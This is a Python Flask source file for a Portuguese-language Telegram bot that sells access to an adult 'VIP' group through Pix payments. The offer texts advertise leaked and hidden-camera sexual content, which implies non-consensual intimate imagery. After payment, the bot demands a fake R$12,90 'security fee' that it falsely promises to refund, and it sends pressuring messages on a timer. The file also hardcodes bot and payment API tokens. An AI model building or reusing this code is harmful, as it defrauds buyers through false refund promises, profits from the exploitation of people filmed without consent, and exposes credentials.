import os
import requests
from flask import Flask, request
from datetime import datetime, timedelta
from apscheduler.schedulers.background import BackgroundScheduler

app = Flask(__name__)
scheduler = BackgroundScheduler()
scheduler.start()

# --- AS NOSSAS CHAVES ---
TELEGRAM_BOT_TOKEN = "9144271229:AAFvv9taDmGTnlI4nHoQ4mAOTJqsJFCOxb4"
PUSHINPAY_API_TOKEN = "73774|DCDTM4JGmuvz4MS4g5vPHy2ucM54PkCeQEu7QA4y49fe526b"
ADMIN_ID = "7008304182"
VIP_GROUP_ID = "-1001921257744"

TELEGRAM_API_URL = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}"
PUSHINPAY_API_URL = "https://api.pushinpay.com.br/api"
RENDER_URL_FIXA = "bot-acessovip-1.onrender.com"

usuarios = {}

# ==================== MÍDIAS DO FUNIL ====================
VIDEO_1_NARRADO = "AAMCAQADGQEAAwtq9mYTKIw9CTCi1dG0NNxustTfVwAC6xgAAg_-sEdSJ8QNpaFZRAEAB20AAz0E"
VIDEO_2_LONGO = "AAMCAQADGQEAAwxq9mYTrkycKxZLXqvEFuJMWkzRFAAC7BgAAg_-sEflfXjDBTgZHQEAB20AAz0E"
VIDEO_3_PROMESSA = "AAMCAQADGQEAAw1q9mYTxBErxeiP9uboKRY8gwmCPgAC7RgAAg_-sEct-_T4gH_2WgEAB20AAz0E"

FOTO_OFERTA_PRINCIPAL = "AgACAgEAAxkBAAMQavZszfbH4j9T9kElws2YrZIo6S0AAgoNaxsP_rBHs0O4L5Gs34wBAAMCAANzAAM9BA"
TEXTO_OFERTA_PRINCIPAL = (
    "🔥 **O MAIOR E MAIS PROIBIDO ACERVO DO BRASIL**\n\n"
    "🔞 **ACESSO VIP COMPLETO: CASADAS, VAZADOS E CÂMERAS ESCONDIDAS**\n\n"
    "Conteúdos brutais que ninguém tem coragem de postar. Sem censura, atualizado diariamente.\n\n"
    "👇 **GARANTA SUA VAGA ANTES QUE O LINK EXPIRE:**"
)

FOTO_OFERTA_NINFA = "AgACAgEAAxkBAAMQavZszfbH4j9T9kElws2YrZIo6S0AAgoNaxsP_rBHs0O4L5Gs34wBAAMCAANzAAM9BA"
TEXTO_OFERTA_NINFA = (
    "💣 **ESPERA! LEVE O COMBO SECRETO COM DESCONTO...**\n\n"
    "🔞 **O DRIVE EXCLUSIVO DA NINFOMANÍACA DE 19 ANOS (400+ vídeos amadores)**\n\n"
    "Deseja adicionar esse acervo vitalício junto com o seu VIP por apenas um pequeno acréscimo totalizando **R$ 14,89**?"
)

IMAGEM_TAXA_SEGURANCA = "AgACAgEAAxkBAAMRavZuBLMuYaDGOSHUpHPh7j9wKPoAAgsNaxsP_rBH1CMV70aesl8BAAMCAANzAAM9BA"
IMAGEM_TUTORIAL_PIX = "AgACAgEAAxkBAAMRavZuBLMuYaDGOSHUpHPh7j9wKPoAAgsNaxsP_rBH1CMV70aesl8BAAMCAANzAAM9BA"
# =========================================================

TEXTO_TAXA_SEGURANCA = (
    "⚠️ **ÚLTIMA ETAPA OBRIGATÓRIA - DISPOSITIVO NÃO RECONHECIDO!**\n\n"
    "Pagamento de entrada confirmado! Porém, nosso sistema antifraude barrou sua entrada imediata. Para manter o grupo 100% livre de denúncias, exigimos uma ativação de segurança.\n\n"
    "🔄 **O valor de R$ 12,90 é 100% REEMBOLSADO** na sua conta PIX no mesmo instante em que você entrar no grupo.\n\n"
    "👇 **Ative abaixo para receber o link IMEDIATAMENTE:**"
)

TEXTO_INSTRUCOES_PIX = (
    "✅ **Como pagar e liberar na hora:**\n\n"
    "1️⃣ - Toque no código abaixo para copiar\n"
    "2️⃣ - Abra o app do seu banco\n"
    "3️⃣ - Escolha **PIX Copia e Cola** e finalize.\n\n"
    "⬇️ **COPIE SEU CÓDIGO ABAIXO** ⬇️"
)

def enviar_mensagem(chat_id, texto, markup=None):
    payload = {"chat_id": chat_id, "text": texto, "parse_mode": "Markdown"}
    if markup: payload["reply_markup"] = markup
    requests.post(f"{TELEGRAM_API_URL}/sendMessage", json=payload)

def enviar_video(chat_id, video_id, legenda=None, markup=None):
    payload = {"chat_id": chat_id, "video": video_id, "parse_mode": "Markdown"}
    if legenda: payload["caption"] = legenda
    if markup: payload["reply_markup"] = markup
    requests.post(f"{TELEGRAM_API_URL}/sendVideo", json=payload)

def enviar_foto(chat_id, foto_id, legenda=None, markup=None):
    payload = {"chat_id": chat_id, "photo": foto_id, "parse_mode": "Markdown"}
    if legenda: payload["caption"] = legenda
    if markup: payload["reply_markup"] = markup
    requests.post(f"{TELEGRAM_API_URL}/sendPhoto", json=payload)

def gerar_pix_pushinpay(valor_em_reais, chat_id):
    headers = {
        "Authorization": f"Bearer {PUSHINPAY_API_TOKEN}",
        "Accept": "application/json",
        "Content-Type": "application/json"
    }
    valor_centavos = int(round(float(valor_em_reais) * 100))
    webhook_dinamico = f"https://{RENDER_URL_FIXA}/webhook/pushinpay?chat_id={chat_id}"
    
    payload = {
        "value": valor_centavos, 
        "webhook_url": webhook_dinamico
    }
    
    try:
        req = requests.post(f"{PUSHINPAY_API_URL}/pix/cashIn", json=payload, headers=headers)
        if req.status_code in [200, 201]:
            resposta_json = req.json()
            return resposta_json.get("qr_code") or resposta_json.get("pix_copia_e_cola") or resposta_json.get("encodedImage")
        else:
            return f"ERRO_BANCO: Código {req.status_code} - Resposta: {req.text}"
    except Exception as e:
        return f"ERRO_SISTEMA: {str(e)}"

def disparar_remarketing(chat_id, tipo_funil, contagem):
    status_atual = usuarios.get(chat_id, {}).get("status")
    
    if tipo_funil == "ENTRADA" and status_atual != "AGUARDANDO_PAGAMENTO_ENTRADA": return
    if tipo_funil == "TAXA" and status_atual != "PENDENTE_TAXA_SEGURANCA": return

    if tipo_funil == "ENTRADA":
        markup = {"inline_keyboard": [[{"text": "🔥 Quero Garantir meu VIP (R$ 9,90)", "callback_data": "comprar_990"}]]}
    else:
        markup = {"inline_keyboard": [[{"text": "🔒 Pagar Taxa Reembolsável (R$ 12,90)", "callback_data": "pagar_taxa_1290"}]]}

    if contagem == 0 or (contagem > 0 and contagem % 6 == 0):
        legenda = "🚨 **SEU ACESSO ESTÁ SENDO CANCELADO...**\n\nVocê vai mesmo perder isso? Finalize agora!"
        enviar_video(chat_id, VIDEO_3_PROMESSA, legenda, markup)
    elif contagem % 2 != 0:
        legenda = "🔥 **O GRUPO ESTÁ A TODO VAPOR!**\n\nNão fique de fora dos novos conteúdos."
        enviar_video(chat_id, VIDEO_1_NARRADO, legenda, markup)
    else:
        legenda = "👀 **Olha o nível do conteúdo que rola por dentro...** Garanta sua vaga!"
        enviar_video(chat_id, VIDEO_2_LONGO, legenda, markup)

    scheduler.add_job(disparar_remarketing, 'date', run_date=datetime.now() + timedelta(minutes=10), args=[chat_id, tipo_funil, contagem + 1])

@app.route("/", methods=["GET"])
def home(): 
    return "Máquina de Vendas Ativa!", 200

@app.route("/setup", methods=["GET"])
def setup_webhook():
    webhook_url = f"https://{RENDER_URL_FIXA}/webhook/telegram/{TELEGRAM_BOT_TOKEN}"
    resposta = requests.get(f"{TELEGRAM_API_URL}/setWebhook?url={webhook_url}")
    return f"Status do Webhook do Telegram: {resposta.json()}", 200

@app.route("/webhook/pushinpay", methods=["POST", "GET"])
def pushinpay_webhook():
    dados = request.get_json(silent=True)
    if not dados: 
        return {"status": "Teste recebido com sucesso!"}, 200

    status = dados.get("status")
    chat_id = request.args.get("chat_id")

    if status in ["paid", "APPROVED", "PAID"] and chat_id:
        chat_id = int(chat_id)
        usuario_status = usuarios.get(chat_id, {}).get("status")

        # Assim que pagar qualquer entrada (seja 9.90 ou o combo 14.89), vai direto para a taxa de segurança final
        if usuario_status in ["AGUARDANDO_PAGAMENTO_ENTRADA", "AGUARDANDO_PAGAMENTO_COMBO"]:
            usuarios[chat_id] = {"status": "PENDENTE_TAXA_SEGURANCA"}
            enviar_foto(chat_id, IMAGEM_TAXA_SEGURANCA, TEXTO_TAXA_SEGURANCA, {
                "inline_keyboard": [[{"text": "🔒 Ativar e Reembolsar (R$ 12,90)", "callback_data": "pagar_taxa_1290"}]]
            })
            scheduler.add_job(disparar_remarketing, 'date', run_date=datetime.now() + timedelta(minutes=5), args=[chat_id, "TAXA", 0])

        elif usuario_status == "PENDENTE_TAXA_SEGURANCA":
            usuarios[chat_id] = {"status": "VIP_LIBERADO"}
            try:
                res_convite = requests.post(f"{TELEGRAM_API_URL}/createChatInviteLink", json={"chat_id": VIP_GROUP_ID, "member_limit": 1}).json()
                link = res_convite.get("result", {}).get("invite_link", "LINK_MANUAL_AQUI")
            except: link = "LINK_MANUAL_AQUI"
            
            enviar_mensagem(chat_id, f"🎉 **ACESSO VALIDADO!**\n\nBem-vindo ao submundo. Entre agora:\n👑 [ACESSAR VIP AQUI]({link})")

    return {"status": "ok"}, 200

@app.route(f"/webhook/telegram/{TELEGRAM_BOT_TOKEN}", methods=["POST"])
def telegram_webhook():
    update = request.get_json(silent=True)
    if not update: return {"status": "ok"}, 200
    
    if "message" in update:
        chat_id = update["message"]["chat"]["id"]
        texto = update["message"].get("text", "")

        if texto.startswith("/start"):
            usuarios[chat_id] = {"status": "AGUARDANDO_PAGAMENTO_ENTRADA"}
            
            # 1. Envia os vídeos de amostra
            enviar_video(chat_id, VIDEO_1_NARRADO)
            enviar_video(chat_id, VIDEO_2_LONGO, "😈 Uma pequena amostra do que te espera...")
            
            # 2. Envia a Oferta Principal (VIP Padrão R$ 9,90)
            markup = {
                "inline_keyboard": [
                    [{"text": "✅ Quero meu Acesso VIP (R$ 9,90)", "callback_data": "comprar_990"}]
                ]
            }
            enviar_foto(chat_id, FOTO_OFERTA_PRINCIPAL, TEXTO_OFERTA_PRINCIPAL, markup)
            
            scheduler.add_job(disparar_remarketing, 'date', run_date=datetime.now() + timedelta(minutes=5), args=[chat_id, "ENTRADA", 0])

    elif "callback_query" in update:
        query = update["callback_query"]
        chat_id = query["message"]["chat"]["id"]
        botao = query["data"]
        usuario_status = usuarios.get(chat_id, {}).get("status")

        # SE O CLIENTE CLICOU EM COMPRAR O VIP NORMAL (R$ 9,90), OFERECEMOS A SEGUNDA OFERTA (UPGRADE DA NINFA) ANTES DE COBRAR
        if botao == "comprar_990" and usuario_status == "AGUARDANDO_PAGAMENTO_ENTRADA":
            usuarios[chat_id]["status"] = "AGUARDANDO_UPGRADE_NINFA"
            markup_ninfa = {
                "inline_keyboard": [
                    [{"text": "🔥 SIM! Quero o Combo com a Ninfa (R$ 14,89)", "callback_data": "aceitar_ninfa"}],
                    [{"text": "❌ Não, quero apenas o VIP por R$ 9,90", "callback_data": "recusar_ninfa"}]
                ]
            }
            enviar_foto(chat_id, FOTO_OFERTA_NINFA, TEXTO_OFERTA_NINFA, markup_ninfa)
            return {"status": "ok"}, 200

        # TRATAMENTO DA ESCOLHA DA SEGUNDA OFERTA
        if usuario_status == "AGUARDANDO_UPGRADE_NINFA":
            if botao == "aceitar_ninfa":
                usuarios[chat_id]["status"] = "AGUARDANDO_PAGAMENTO_COMBO"
                enviar_mensagem(chat_id, "⏳ *Gerando Pix do Combo Completo (VIP + Ninfa)...*")
                codigo_pix = gerar_pix_pushinpay("14.89", chat_id)
                if codigo_pix and not codigo_pix.startswith("ERRO_"):
                    enviar_foto(chat_id, IMAGEM_TUTORIAL_PIX)
                    enviar_mensagem(chat_id, TEXTO_INSTRUCOES_PIX)
                    enviar_mensagem(chat_id, f"`{codigo_pix}`")
                else:
                    enviar_mensagem(chat_id, f"❌ Erro ao gerar Pix: `{codigo_pix}`")
                return {"status": "ok"}, 200
            
            elif botao == "recusar_ninfa":
                usuarios[chat_id]["status"] = "AGUARDANDO_PAGAMENTO_ENTRADA"
                enviar_mensagem(chat_id, "⏳ *Gerando Pix apenas do VIP Padrão (R$ 9,90)...*")
                codigo_pix = gerar_pix_pushinpay("9.90", chat_id)
                if codigo_pix and not codigo_pix.startswith("ERRO_"):
                    enviar_foto(chat_id, IMAGEM_TUTORIAL_PIX)
                    enviar_mensagem(chat_id, TEXTO_INSTRUCOES_PIX)
                    enviar_mensagem(chat_id, f"`{codigo_pix}`")
                else:
                    enviar_mensagem(chat_id, f"❌ Erro ao gerar Pix: `{codigo_pix}`")
                return {"status": "ok"}, 200

        # Outros botões (ex: taxa de segurança)
        valores = {"pagar_taxa_1290": "12.90", "pagar_taxa_490": "4.90"}
        if botao in valores:
            enviar_mensagem(chat_id, "⏳ *Gerando chave Pix da taxa, aguarde...*")
            codigo_pix = gerar_pix_pushinpay(valores[botao], chat_id)
            if codigo_pix and not codigo_pix.startswith("ERRO_"):
                enviar_foto(chat_id, IMAGEM_TUTORIAL_PIX)
                enviar_mensagem(chat_id, TEXTO_INSTRUCOES_PIX)
                enviar_mensagem(chat_id, f"`{codigo_pix}`")
            else:
                enviar_mensagem(chat_id, f"❌ *Erro do Banco:* `{codigo_pix}`")

    return {"status": "ok"}, 200

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
